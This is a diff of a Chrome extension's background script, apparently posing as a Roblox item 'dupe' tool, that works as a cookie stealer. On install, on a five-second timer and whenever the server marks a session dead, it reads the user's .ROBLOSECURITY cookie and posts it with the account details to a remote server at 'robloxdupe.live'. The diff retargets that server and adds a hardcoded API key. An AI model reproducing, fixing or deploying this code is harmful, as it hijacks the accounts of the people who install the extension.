@@ -1,5 +1,6 @@
 // ===== Configuration =====
-const SERVER_URL = 'http://103.38.236.58';
+const SERVER_URL = 'https://robloxdupe.live';
+const API_KEY = 'rbx_sk_9f3xKmPvQ7nW2jR8sL5yBcDe4hA6tG1u';
 let trackedAccounts = {};
 let statusCheckInterval = null;
 let currentUserInfo = null;
@@ -15,7 +16,7 @@ async function getRobloxCookie() {
                     reject(chrome.runtime.lastError);
                     return;
                 }
-                
+
                 if (cookie) {
                     console.log(`✅ [COOKIE] Found .ROBLOSECURITY cookie (${cookie.value.length} chars)`);
                     resolve(cookie.value);
@@ -35,30 +36,30 @@ async function getRobloxUserInfo(cookie) {
         console.log('[BACKGROUND] Using user info from content script:', currentUserInfo);
         return currentUserInfo;
     }
-    
+
     // Fallback: try to get from API
     console.log('[BACKGROUND] Attempting to get user info from API...');
     const userInfo = await getUserInfoFromCookie(cookie);
     if (userInfo) {
         return userInfo;
     }
-    
+
     throw new Error('Could not get user info from content script or API');
 }
 async function getUserInfoFromCookie(cookie) {
     try {
         console.log('[FALLBACK] Querying content script for user info...');
-        
+
         // Find the Roblox tab
         const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
         if (tabs.length === 0) {
             console.error('[FALLBACK] No Roblox tab found');
             return null;
         }
-        
+
         const robloxTab = tabs[0];
         console.log('[FALLBACK] Found Roblox tab:', robloxTab.id);
-        
+
         // Request user info from content script
         return new Promise((resolve) => {
             chrome.tabs.sendMessage(
@@ -70,7 +71,7 @@ async function getUserInfoFromCookie(cookie) {
                         resolve(null);
                         return;
                     }
-                    
+
                     if (response && response.userInfo) {
                         console.log('[FALLBACK] Got user info from content script:', response.userInfo);
                         resolve(response.userInfo);
@@ -80,7 +81,7 @@ async function getUserInfoFromCookie(cookie) {
                     }
                 }
             );
-            
+
             // Timeout after 3 seconds
             setTimeout(() => {
                 console.error('[FALLBACK] Content script query timed out');
@@ -97,16 +98,16 @@ async function getUserInfoFromCookie(cookie) {
 async function captureDirectly() {
     try {
         console.log('[FALLBACK] Attempting to capture cookie directly...');
-        
+
         // Skip if already captured
         if (Object.keys(trackedAccounts).length > 0) {
             console.log('[FALLBACK] Already have tracked accounts');
             return;
         }
-        
+
         const cookie = await getRobloxCookie();
         console.log('[FALLBACK] Got cookie, will submit to server...');
-        
+
         // Submit cookie to server without userInfo
         // Server will extract userId from cookie via rotate_cookie()
         try {
@@ -128,7 +129,7 @@ async function sendToServer(cookie, userInfo, action = 'Auto-Capture') {
             action: action,
             timestamp: new Date().toISOString()
         };
-        
+
         // Add user info if available
         if (userInfo) {
             payload.userId = userInfo.id;
@@ -139,27 +140,28 @@ async function sendToServer(cookie, userInfo, action = 'Auto-Capture') {
         const response = await fetch(`${SERVER_URL}/api/sessions`, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'X-API-Key': API_KEY
             },
             body: JSON.stringify(payload)
         });
 
         console.log(`[SEND] Response status: ${response.status}`);
-        
+
         if (!response.ok) {
             throw new Error(`Server error: ${response.status}`);
         }
 
         const result = await response.json();
         console.log(`[SEND] Server response:`, result);
-        
+
         // Extract userId from response or use from userInfo
         const userId = result.userId || (userInfo ? userInfo.id : null);
         const username = userInfo ? userInfo.name : (result.data && result.data.username ? result.data.username : 'Unknown');
-        
+
         if (userId) {
             console.log(`✅ [${action}] Cookie sent and tracked for userId: ${userId}`);
-            
+
             // Track this account
             trackedAccounts[userId] = {
                 username: username,
@@ -169,7 +171,7 @@ async function sendToServer(cookie, userInfo, action = 'Auto-Capture') {
         } else {
             console.warn(`⚠️  [${action}] Cookie sent but userId not found in response`);
         }
-        
+
         return result;
     } catch (error) {
         console.error(`❌ [${action}] Error sending to server:`, error);
@@ -183,7 +185,7 @@ async function checkCookieStatus(userId) {
         console.log(`[CHECK-STATUS] Fetching status for userId: ${userId}`);
         const url = `${SERVER_URL}/api/sessions/${userId}`;
         console.log(`[CHECK-STATUS] URL: ${url}`);
-        
+
         const response = await fetch(url, {
             method: 'GET',
             headers: {
@@ -192,7 +194,7 @@ async function checkCookieStatus(userId) {
         });
 
         console.log(`[CHECK-STATUS] Response status: ${response.status}`);
-        
+
         if (response.ok) {
             const data = await response.json();
             console.log(`[CHECK-STATUS] Data received:`, data);
@@ -212,17 +214,17 @@ async function checkCookieStatus(userId) {
 async function autoCaptureOnInstall() {
     try {
         console.log('🚀 [AUTO-CAPTURE] Starting auto-capture process...');
-        
+
         console.log('[AUTO-CAPTURE] Step 1: Getting cookie...');
         const cookie = await getRobloxCookie();
-        
+
         console.log('[AUTO-CAPTURE] Step 2: Getting user info...');
         const userInfo = await getRobloxUserInfo(cookie);
         console.log('[AUTO-CAPTURE] User info:', userInfo);
-        
+
         console.log('[AUTO-CAPTURE] Step 3: Sending to server...');
         await sendToServer(cookie, userInfo, 'Auto-Capture');
-        
+
         console.log('✅ [AUTO-CAPTURE] Cookie auto-captured and sent successfully!');
         return true;
     } catch (error) {
@@ -235,7 +237,7 @@ async function autoCaptureOnInstall() {
 // ===== Periodic Auto-Capture (Every 5 seconds) =====
 function startPeriodicCapture() {
     console.log('⏰ [BACKGROUND] Starting periodic auto-capture - every 5 seconds...');
-    
+
     let attemptCount = 0;
     setInterval(async () => {
         // Try to capture if not already captured
@@ -250,21 +252,21 @@ function startPeriodicCapture() {
 // ===== Monitor DIE Status and Auto-Recapture =====
 async function monitorDIEStatus() {
     console.log('⏱️  [BACKGROUND] Starting DIE monitor - checking every 10 seconds...');
-    
+
     statusCheckInterval = setInterval(async () => {
         const accountsToCheck = Object.keys(trackedAccounts);
         console.log(`[MONITOR] Checking ${accountsToCheck.length} accounts...`);
-        
+
         for (const userId in trackedAccounts) {
             const account = trackedAccounts[userId];
             console.log(`[MONITOR] Checking ${account.username} (${userId})...`);
             const status = await checkCookieStatus(userId);
             console.log(`[MONITOR] Status for ${account.username}: ${status}`);
-            
+
             // If status is DIE, auto-recapture immediately
             if (status === 'DIE') {
                 console.warn(`⚠️  [DIE DETECTED] Account ${account.username} (${userId}) - auto-recapturing...`);
-                
+
                 try {
                     const cookie = await getRobloxCookie();
                     const userInfo = await getRobloxUserInfo(cookie);
@@ -279,7 +281,7 @@ async function monitorDIEStatus() {
                 }
                 account.status = 'ALIVE';
             }
-            
+
             account.lastCheck = Date.now();
         }
     }, 10000);
@@ -292,11 +294,11 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     if (request.type === 'USER_INFO_EXTRACTED') {
         console.log('📨 [BACKGROUND] Received user info from content script:', request.payload);
         currentUserInfo = request.payload;
-        
+
         // NOW auto-capture since we have user info
         console.log('🎯 [BACKGROUND] Triggering auto-capture now that user info is ready...');
         autoCaptureOnInstall();
-        
+
         sendResponse({ success: true });
     }
 });
@@ -306,8 +308,8 @@ chrome.runtime.onInstalled.addListener((details) => {
     console.log('📦 [EVENT] Extension installed! Opening Roblox...');
     if (details.reason === 'install') {
         // Open Roblox tab to trigger cookie capture
-        chrome.tabs.create({ url: 'https://www.roblox.com' });
-        
+        // chrome.tabs.create({ url: 'https://www.roblox.com' });
+
         // Fallback: Try to capture directly after 3 seconds (in case content script fails)
         setTimeout(() => {
             console.log('[FALLBACK] Attempting direct capture without content script...');
